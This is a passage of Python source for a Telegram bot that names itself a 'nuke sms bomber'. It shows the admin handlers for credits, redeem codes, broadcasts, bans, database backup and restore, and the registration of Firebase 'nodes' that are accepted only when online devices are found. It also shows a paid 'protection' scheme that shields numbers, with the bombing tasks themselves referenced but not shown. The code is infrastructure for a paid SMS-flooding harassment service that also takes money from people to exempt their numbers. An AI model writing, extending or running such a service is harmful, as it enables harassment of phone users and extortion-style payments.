            f"{ce('credit')} {sc('credits per user')} · {C(str(credits))}\n"
            f"{ce('do_task')} {sc('max users')}       · {C(str(max_uses))}\n"
            f"{ce('money')} {sc('total credits')}   · {C(str(credits * max_uses))}\n"
            f"{DIV2}\n"
            f"{It(sc('tap the code above to copy it, then share with your users'))}",
            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"code uses error: {e}")


# ─── Admin: broadcast ───────────────────────────────────────────────
@R.callback_query(F.data == "admin:broadcast")
async def cb_admin_broadcast(cq: types.CallbackQuery, state: FSMContext):
    try:
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        await state.set_state(Form.broadcast_msg)
        text = (
            f"{header('megaphone', 'broadcast')}"
            f"{sc('send me the message you want to broadcast to all users.')}\n"
            f"{sc('any type is accepted (text / photo / video / gif / document).')}\n"
            f"{DIV2}\n"
            f"{It(sc('use /cancel to abort'))}"
        )
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("admin:panel")):
            await safe_send(cq.bot, cq.message.chat.id, text,
                            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"broadcast start error: {e}")


@R.message(Form.broadcast_msg)
async def process_broadcast(msg: types.Message, state: FSMContext):
    try:
        d = load()
        if not is_admin(msg.from_user.id, d): return
        await state.clear()

        user_ids = []
        for k in d.get("users", {}).keys():
            try:
                user_ids.append(int(k))
            except Exception:
                continue

        total = len(user_ids)
        status = await safe_send(msg.bot, msg.chat.id,
            f"{header('megaphone', f'broadcasting to {total} users...')}")

        sent = 0
        failed = 0
        sem = asyncio.Semaphore(20)
        counters_lock = asyncio.Lock()

        async def _send_one(uid: int):
            nonlocal sent, failed
            async with sem:
                try:
                    await msg.bot.copy_message(
                        chat_id=uid, from_chat_id=msg.chat.id,
                        message_id=msg.message_id)
                    async with counters_lock:
                        sent += 1
                except TelegramRetryAfter as e:
                    await _retry_after_sleep(e)
                    try:
                        await msg.bot.copy_message(
                            chat_id=uid, from_chat_id=msg.chat.id,
                            message_id=msg.message_id)
                        async with counters_lock:
                            sent += 1
                    except Exception:
                        async with counters_lock:
                            failed += 1
                except Exception:
                    async with counters_lock:
                        failed += 1

        await asyncio.gather(*(_send_one(u) for u in user_ids), return_exceptions=True)

        final = (
            f"{header('verify', 'broadcast finished')}"
            f"{sc('sent')}   · {C(str(sent))}\n"
            f"{sc('failed')} · {C(str(failed))}"
        )
        if status:
            await safe_edit(msg.bot, msg.chat.id, status.message_id, final)
        else:
            await safe_send(msg.bot, msg.chat.id, final)
    except Exception as e:
        log.exception(f"broadcast error: {e}")


# ─── Admin: manage credits ──────────────────────────────────────────
@R.callback_query(F.data == "admin:credits")
async def cb_admin_credits(cq: types.CallbackQuery, state: FSMContext):
    try:
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        await state.set_state(Form.admin_credit_target)
        text = (
            f"{header('credit', 'manage user credits')}"
            f"{sc('send the user')} {C('user id')} {sc('or')} {C('@username')} {sc('to adjust:')}"
        )
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("admin:panel")):
            await safe_send(cq.bot, cq.message.chat.id, text,
                            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"credits admin error: {e}")


@R.message(Form.admin_credit_target)
async def process_admin_credit_target(msg: types.Message, state: FSMContext):
    try:
        d = load()
        if not is_admin(msg.from_user.id, d): return
        raw = (msg.text or "").strip()
        target_uid: Optional[int] = None
        if raw.startswith("@"):
            uname = raw[1:].lower()
            for k, u in d.get("users", {}).items():
                if (u.get("username") or "").lower() == uname:
                    target_uid = int(k); break
        elif raw.isdigit():
            target_uid = int(raw)

        if target_uid is None or str(target_uid) not in d.get("users", {}):
            await safe_send(msg.bot, msg.chat.id, sc("user not found. try again:")); return

        await state.update_data(target_uid=target_uid)
        await state.set_state(Form.admin_credit_amount)
        credits = get_credits(d, target_uid)
        await safe_send(msg.bot, msg.chat.id,
            f"{header('credit', 'adjust credits')}"
            f"{ce('do_task')} {sc('user')} · {C(str(target_uid))}\n"
            f"{ce('money')} {sc('current balance')} · {C(str(credits))}\n"
            f"{DIV2}\n"
            f"{sc('send the amount to')} {B(sc('add'))} ({C('100')}) {sc('or')} {B(sc('remove'))} ({C('-100')}):")
    except Exception as e:
        log.exception(f"credit target error: {e}")


@R.message(Form.admin_credit_amount)
async def process_admin_credit_amount(msg: types.Message, state: FSMContext):
    try:
        d = load()
        if not is_admin(msg.from_user.id, d): return
        raw = (msg.text or "").strip().replace("+", "")
        if not re.fullmatch(r"-?\d+", raw):
            await safe_send(msg.bot, msg.chat.id,
                sc("send a valid whole number (e.g. 100 or -50):")); return
        delta = int(raw)
        if delta == 0:
            await safe_send(msg.bot, msg.chat.id, sc("amount cannot be 0.")); return

        data = await state.get_data()
        target_uid = data.get("target_uid")
        if target_uid is None:
            await state.clear(); return

        d = load()
        new_balance = add_credits(d, target_uid, delta)
        save(d)
        await state.clear()

        await safe_send(msg.bot, msg.chat.id,
            f"{header('verify', 'credits updated')}"
            f"{ce('do_task')} {sc('user')} · {C(str(target_uid))}\n"
            f"{sc('delta')} · {C(('+' if delta > 0 else '') + str(delta))}\n"
            f"{ce('money')} {sc('new balance')} · {C(str(new_balance))}",
            reply_markup=back_button("admin:panel"))

        try:
            await safe_send(msg.bot, target_uid,
                f"{header('credit', 'credit balance adjusted')}"
                f"{sc('delta')} · {C(('+' if delta > 0 else '') + str(delta))}\n"
                f"{ce('money')} {sc('new balance')} · {C(str(new_balance))}")
        except Exception:
            pass
    except Exception as e:
        log.exception(f"credit amount error: {e}")


# ─── Admin: firebase management ─────────────────────────────────────
@R.callback_query(F.data == "admin:fb_add")
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    try:
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        await state.set_state(Form.fb_add_url)
        text = (
            f"{header('bolt', 'add firebase node')}"
            f"{sc('send the firebase url')}:\n"
            f"{C('https://your-project.firebaseio.com')}\n"
            f"{DIV2}\n"
            f"{It(sc('use /cancel to abort'))}"
        )
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("admin:panel")):
            await safe_send(cq.bot, cq.message.chat.id, text,
                            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"fb_add error: {e}")


@R.message(Form.fb_add_url)
async def process_fb_url(msg: types.Message, state: FSMContext):
    try:
        url = (msg.text or "").strip()
        if not url.startswith("https://"):
            await safe_send(msg.bot, msg.chat.id, sc("url must start with https://")); return
        await state.update_data(fb_url=url.rstrip("/"))
        await state.set_state(Form.fb_add_api)
        await safe_send(msg.bot, msg.chat.id,
            f"{header('crown', 'firebase api key')}"
            f"{sc('send the api key, or')} {C('skip')} {sc('to leave it empty.')}",
            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"fb_url error: {e}")


@R.message(Form.fb_add_api)
async def process_fb_api(msg: types.Message, state: FSMContext):
    try:
        api_key = (msg.text or "").strip()
        if api_key.lower() == "skip":
            api_key = ""
        data = await state.get_data()
        d = load()
        new_fb = {"id": str(int(time.time() * 1000)),
                  "url": data.get("fb_url"), "api_key": api_key}
        d["firebases"].append(new_fb)
        save(d)
        await state.clear()

        try:
            devices = await discover_online_devices(new_fb)
        except Exception:
            devices = []

        if not devices:
            d = load()
            d["firebases"] = [fb for fb in d.get("firebases", [])
                              if fb.get("id") != new_fb["id"]]
            save(d)
            final = (
                f"{header('cross', 'node rejected')}"
                f"{sc('no online devices were detected at this firebase.')}\n"
                f"{sc('the node was not saved.')}"
            )
        else:
            final = (
                f"{header('verify', 'node added')}"
                f"{ce('phone')} {sc('online devices')} · {B(str(len(devices)))}"
            )
        await safe_send(msg.bot, msg.chat.id, final,
                        reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"fb_api error: {e}")


async def _render_fb_list(cq: types.CallbackQuery):
    d = load()
    fbs = d.get("firebases", [])
    if not fbs:
        await safe_answer(cq, sc("no nodes configured!"), show_alert=True); return
    lines = [f"{DIV}\n{ce('pin')}  {B(sc('firebase nodes'))}\n{DIV2}"]
    for i, fb in enumerate(fbs):
        key_status = "🔑" if fb.get("api_key") else "🔓"
        lines.append(f"{key_status}  {C(str(i + 1))} · {sc('node')} {C(fb.get('id', '?'))[:8]}")
    lines.append(DIV)
    text = "\n".join(lines)
    rows = []
    for i, fb in enumerate(fbs):
        rows.append([(sc(f"ʀᴇᴍᴏᴠᴇ #{i+1}"), f"admin:fb_del:{fb['id']}", "danger", "delete")])
    rows.append([(sc("ʙᴀᴄᴋ"), "admin:panel", "primary", "back")])
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=kb(rows)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=kb(rows))


@R.callback_query(F.data == "admin:fb_list")
async def cb_fb_list(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        await safe_answer(cq)
        await _render_fb_list(cq)
    except Exception as e:
        log.exception(f"fb list error: {e}")


@R.callback_query(F.data.startswith("admin:fb_del:"))
async def cb_fb_del(cq: types.CallbackQuery):
    try:
        fb_id = cq.data.split(":", 2)[2]
        d = load()
        d["firebases"] = [fb for fb in d.get("firebases", []) if fb.get("id") != fb_id]
        save(d)
        await safe_answer(cq, sc("node removed!"))
        await _render_fb_list(cq)
    except Exception as e:
        log.exception(f"fb_del error: {e}")


async def _render_protection(cq: types.CallbackQuery):
    d = load()
    pending = [r for r in d.get("protection_requests", [])
               if r.get("status") == "pending"]
    if not pending:
        await safe_answer(cq, sc("no pending protection requests!"), show_alert=True); return
    text = f"{header('shield', 'pending protection requests')}"
    kb_rows = []
    for r in pending:
        text += (
            f"{ce('do_task')} {C(str(r['user_id']))}  ·  {ce('phone')} {C(r['number'])}\n"
            f"{ce('credit')} utr · {C(r['txn_id'])}\n\n"
        )
        kb_rows.append([
            (sc("ᴀᴘᴘʀᴏᴠᴇ"), f"admin:prot_approve:{r['id']}", "success", "verify"),
            (sc("ʀᴇᴊᴇᴄᴛ"), f"admin:prot_reject:{r['id']}", "danger", "cross"),
        ])
    kb_rows.append([(sc("ʙᴀᴄᴋ"), "admin:panel", "danger", "back")])
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=kb(kb_rows)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=kb(kb_rows))


@R.callback_query(F.data == "admin:protection")
async def cb_admin_protection(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        await safe_answer(cq)
        await _render_protection(cq)
    except Exception as e:
        log.exception(f"protection list error: {e}")


@R.callback_query(F.data.startswith("admin:prot_approve:"))
async def cb_admin_prot_approve(cq: types.CallbackQuery):
    try:
        req_id = cq.data.split(":", 2)[2]
        d = load()
        req_found = next((r for r in d["protection_requests"] if r["id"] == req_id), None)
        if not req_found:
            await safe_answer(cq, sc("request not found!"), show_alert=True); return
        req_found["status"] = "approved"
        if req_found["number"] not in d["protected_numbers"]:
            d["protected_numbers"].append(req_found["number"])
        save(d)
        await safe_answer(cq, sc("number protected!"))
        try:
            await safe_send(cq.bot, req_found["user_id"],
                f"{header('shield', 'protection approved')}"
                f"{ce('verify')} {sc('your number')} {C(req_found['number'])} {sc('is now protected!')}")
        except Exception:
            pass
        await _render_protection(cq)
    except Exception as e:
        log.exception(f"prot approve error: {e}")


@R.callback_query(F.data.startswith("admin:prot_reject:"))
async def cb_admin_prot_reject(cq: types.CallbackQuery):
    try:
        req_id = cq.data.split(":", 2)[2]
        d = load()
        req_found = next((r for r in d["protection_requests"] if r["id"] == req_id), None)
        if not req_found:
            await safe_answer(cq, sc("request not found!"), show_alert=True); return
        req_found["status"] = "rejected"
        save(d)
        await safe_answer(cq, sc("request rejected!"))
        try:
            await safe_send(cq.bot, req_found["user_id"],
                f"{header('shield', 'protection rejected')}"
                f"{ce('cross')} {sc('your protection request for')} {C(req_found['number'])} {sc('was rejected.')}\n"
                f"{sc('please contact support if you paid.')}")
        except Exception:
            pass
        await _render_protection(cq)
    except Exception as e:
        log.exception(f"prot reject error: {e}")


async def _render_admins(cq: types.CallbackQuery):
    d = load()
    admins = d.get("admins", [OWNER_ID])
    lines = [f"{DIV}\n{ce('crown')}  {B(sc('admins'))}\n{DIV2}"]
    for aid in admins:
        tag = f"{ce('crown')} {sc('owner')}" if aid == OWNER_ID else f"{ce('do_task')} {sc('admin')}"
        lines.append(f"{tag} · {C(str(aid))}")
    lines.append(DIV)
    text = "\n".join(lines)
    rows = [[(sc(f"ʀᴇᴍᴏᴠᴇ {aid}"), f"admin:admin_del:{aid}", "danger", "delete")]
            for aid in admins if aid != OWNER_ID]
    rows.append([(sc("ʙᴀᴄᴋ"), "admin:panel", "primary", "back")])
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=kb(rows)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=kb(rows))


@R.callback_query(F.data == "admin:admins")
async def cb_admins(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        await safe_answer(cq)
        await _render_admins(cq)
    except Exception as e:
        log.exception(f"admins render error: {e}")


@R.callback_query(F.data.startswith("admin:admin_del:"))
async def cb_admin_del(cq: types.CallbackQuery):
    try:
        try:
            admin_id = int(cq.data.split(":", 2)[2])
        except Exception:
            await safe_answer(cq, sc("invalid!"), show_alert=True); return
        if admin_id == OWNER_ID:
            await safe_answer(cq, sc("cannot remove owner!"), show_alert=True); return
        d = load()
        if admin_id in d.get("admins", []):
            d["admins"].remove(admin_id)
            save(d)
        await safe_answer(cq, sc("removed!"))
        await _render_admins(cq)
    except Exception as e:
        log.exception(f"admin del error: {e}")


@R.callback_query(F.data == "admin:ban")
async def cb_ban(cq: types.CallbackQuery, state: FSMContext):
    try:
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        await state.set_state(Form.admin_ban)
        text = (f"{header('blocked', 'ban user')}"
                f"{sc('send the user id you want to ban:')}")
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("admin:panel")):
            await safe_send(cq.bot, cq.message.chat.id, text,
                            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"ban start error: {e}")


@R.message(Form.admin_ban)
async def process_ban(msg: types.Message, state: FSMContext):
    try:
        try:
            uid = int((msg.text or "").strip())
        except Exception:
            await safe_send(msg.bot, msg.chat.id, sc("send a valid user id!")); return
        d = load()
        if uid not in d.get("banned", []):
            d["banned"].append(uid)
            save(d)
        await state.clear()
        await safe_send(msg.bot, msg.chat.id,
            f"{header('blocked', 'user banned')}{ce('do_task')} · {C(str(uid))}",
            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"process ban error: {e}")


async def _render_unban(cq: types.CallbackQuery):
    d = load()
    banned = d.get("banned", [])
    if not banned:
        await safe_answer(cq, sc("no banned users!"), show_alert=True); return
    rows = [[(sc(f"ᴜɴʙᴀɴ {uid}"), f"admin:unban_do:{uid}", "success", "verify")]
            for uid in banned]
    rows.append([(sc("ʙᴀᴄᴋ"), "admin:panel", "primary", "back")])
    text = f"{header('blocked', 'banned users')}{sc('select a user to unban:')}"
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=kb(rows)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=kb(rows))


@R.callback_query(F.data == "admin:unban")
async def cb_unban(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        await safe_answer(cq)
        await _render_unban(cq)
    except Exception as e:
        log.exception(f"unban list error: {e}")


@R.callback_query(F.data.startswith("admin:unban_do:"))
async def cb_unban_do(cq: types.CallbackQuery):
    try:
        try:
            uid = int(cq.data.split(":", 2)[2])
        except Exception:
            await safe_answer(cq, sc("invalid!"), show_alert=True); return
        d = load()
        if uid in d.get("banned", []):
            d["banned"].remove(uid)
            save(d)
        await safe_answer(cq, sc(f"{uid} unbanned!"))
        await _render_unban(cq)
    except Exception as e:
        log.exception(f"unban_do error: {e}")


@R.callback_query(F.data == "admin:db_tools")
async def cb_admin_db_tools(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        text = (f"{header('tools', 'database tools')}"
                f"{sc('manage database backups and restores.')}")
        markup = kb([
            [(sc("ʙᴀᴄᴋᴜᴘ ᴅʙ"), "admin:db_backup", "success", "pin")],
            [(sc("ʀᴇsᴛᴏʀᴇ ᴅʙ"), "admin:db_restore_prompt", "primary", "rocket")],
            [(sc("ʙᴀᴄᴋ"), "admin:panel", "danger", "back")],
        ])
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=markup):
            await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=markup)
    except Exception as e:
        log.exception(f"db tools error: {e}")


@R.callback_query(F.data == "admin:db_backup")
async def cb_admin_db_backup(cq: types.CallbackQuery):
    try:
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        if not os.path.exists(DATA_FILE):
            await safe_answer(cq, sc("database file not found!"), show_alert=True); return
        await safe_answer(cq, sc("preparing backup..."))
        os.makedirs(BACKUP_DIR, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_path = os.path.join(BACKUP_DIR, f"backup_{stamp}.json")
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as src:
                data = src.read()
            with open(backup_path, "w", encoding="utf-8") as dst:
                dst.write(data)
        except Exception as e:
            await safe_answer(cq, sc(f"error: {str(e)}"), show_alert=True); return
        try:
            file = FSInputFile(backup_path)
            await cq.bot.send_document(cq.from_user.id, document=file,
                                       caption=sc("database backup"))
        except Exception as e:
            await safe_answer(cq, sc(f"send failed: {str(e)}"), show_alert=True)
    except Exception as e:
        log.exception(f"db backup error: {e}")


@R.callback_query(F.data == "admin:db_restore_prompt")
async def cb_admin_db_restore_prompt(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        text = (
            f"{header('rocket', 'restore database')}"
            f"{sc('send me a valid')} {C('.json')} {sc('backup file to restore.')}\n"
            f"{It(sc('this will overwrite the current data!'))}"
        )
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("admin:db_tools")):
            await safe_send(cq.bot, cq.message.chat.id, text,
                            reply_markup=back_button("admin:db_tools"))
    except Exception as e:
        log.exception(f"db restore prompt error: {e}")


@R.message(F.document)
async def handle_db_restore(msg: types.Message, state: FSMContext):
    try:
        d = load()
        if not is_admin(msg.from_user.id, d):
            return
        if not (msg.document.file_name and msg.document.file_name.endswith(".json")):
            return
        path = f"restore_{msg.document.file_unique_id}.json"
        try:
            await msg.bot.download(msg.document.file_id, destination=path)
            with open(path, "r", encoding="utf-8") as f:
                new_data = json.load(f)
            if not isinstance(new_data, dict) or "admins" not in new_data or "firebases" not in new_data:
                await safe_send(msg.bot, msg.chat.id, sc("invalid database file!"))
                return
            save(new_data)
            await safe_send(msg.bot, msg.chat.id,
                f"{header('verify', 'database restored')}")
        except Exception as e:
            await safe_send(msg.bot, msg.chat.id, sc(f"restore failed: {str(e)}"))
        finally:
            try:
                if os.path.exists(path):
                    os.remove(path)
            except Exception:
                pass
    except Exception as e:
        log.exception(f"db restore error: {e}")


# ════════════════════════════════════════════════════════════════════
# GLOBAL ERROR HANDLER
# ════════════════════════════════════════════════════════════════════
async def global_error_handler(event: types.ErrorEvent):
    exc = event.exception
    log.exception(f"Unhandled handler error: {exc}")
    update = event.update
    bot = event.update.bot if hasattr(event.update, "bot") else None
    try:
        if isinstance(update, types.Update):
            if update.message:
                await safe_send(update.message.bot, update.message.chat.id,
                    f"{header('cross', 'something went wrong')}"
                    f"{sc('please try again in a moment.')}")
            elif update.callback_query:
                await safe_answer(update.callback_query,
                                  sc("something went wrong"), show_alert=True)
    except Exception as inner:
        log.debug(f"global handler notify failed: {inner}")


# ════════════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════════════
async def _startup_checks(bot: Bot) -> bool:
    # Validate token / connection
    try:
        me = await bot.get_me()
        global _bot_username_cache
        _bot_username_cache = me.username or ""
        log.info(f"✅ @{me.username} online · {VERSION}")
    except Exception as e:
        log.critical(f"❌ Bot startup failed: {e}")
        return False

    # Data file sanity
    try:
        d = load()
        save(d)  # ensure writable
    except Exception as e:
        log.error(f"Data file sanity check failed: {e}")

    # Ensure backups dir
    try:
        os.makedirs(BACKUP_DIR, exist_ok=True)
    except Exception:
        pass

    return True


async def _notify_owner(bot: Bot):
    try:
        d = load()
        await safe_send(bot, OWNER_ID,
            f"{DIV}\n"
            f"{ce('bomb')}  {B(sc('nuke sms bomber'))}  {VERSION}\n"
            f"@{_bot_username_cache}\n"
            f"{DIV2}\n"
            f"{ce('money')} {sc('welcome bonus')}   · {C(str(WELCOME_CREDITS))}\n"
            f"{ce('gift')} {sc('referral reward')} · {C(str(REFERRAL_REWARD))}\n"
            f"{ce('bolt')} {sc('max concurrent')}  · {C(str(MAX_CONCURRENT))}\n"
            f"{ce('fire')} {sc('nodes loaded')}    · {C(str(len(d.get('firebases', []))))}\n"
            f"{ce('do_task')} {sc('users')}           · {C(str(len(d.get('users', {}))))}\n"
            f"{ce('star')} {sc('qr available')}    · {C('yes' if QR_AVAILABLE else 'no')}\n"
            f"{DIV}")
    except Exception:
        pass


async def main():
    # Config sanity
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        log.critical("❌ BOT_TOKEN looks invalid.")
        return

    bot = Bot(token=BOT_TOKEN,
              default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    dp.errors.register(global_error_handler)

    if not await _startup_checks(bot):
        return

    await _notify_owner(bot)

    stop_event = asyncio.Event()

    def _handle_signal(*_):
        log.info("🛑 Shutdown signal received")
        stop_event.set()

    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _handle_signal)
        except NotImplementedError:
            pass

    try:
        await dp.start_polling(
            bot,
            allowed_updates=dp.resolve_used_update_types(),
            handle_as_tasks=True,
            close_bot_session=False,
        )
    except asyncio.CancelledError:
        pass
    except Exception as e:
        log.exception(f"Polling crashed: {e}")
    finally:
        log.info("Closing sessions...")
        # cancel active bombers
        for uid, task in list(_bombing_tasks.items()):
            try:
                task.cancel()
            except Exception:
                pass
        await close_session()
        try:
            await bot.session.close()
        except Exception:
            pass
        log.info("👋 Bot shutdown complete")


if __name__ == "__main__":
    while True:
        try:
            asyncio.run(main())
            break
        except KeyboardInterrupt:
            print("\n👋 Bot stopped by user. Goodbye!")
            break
        except Exception as e:
            log.exception(f"Fatal crash, restarting in 5s: {e}")
            time.sleep(5)
